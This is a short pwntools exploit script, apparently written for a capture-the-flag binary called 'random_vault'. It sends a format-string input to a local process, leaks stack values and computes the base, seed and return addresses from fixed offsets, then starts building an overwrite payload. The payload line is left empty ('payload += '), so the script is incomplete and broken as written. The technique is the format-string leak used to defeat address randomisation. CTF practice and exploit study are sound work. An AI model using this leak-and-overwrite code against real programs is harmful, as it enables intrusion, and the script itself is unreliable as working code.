from pwn import *

context.update(log_level='debug')

p = process('random_vault')
len_name = 0x51
p.sendlineafter(': ', '%lx|'*11)

offset_bss = 0x1750
offset_seed = 0x5008
arr_leak = p.recvrepeat(1).split('|')

addr_ret = int(arr_leak[6], 16) - 0x70 + 8
addr_base_bss = int(arr_leak[10], 16) - offset_bss
addr_seed = addr_base_bss + offset_seed


log.info('base: ' + hex(addr_base_bss))
log.info('seed: ' + hex(addr_seed))
log.info('ret: ' + hex(addr_ret))

raw_input('pid: ' + str(p.pid))


payload = ''

payload += 
p.sendline(payload)

p.interactive()

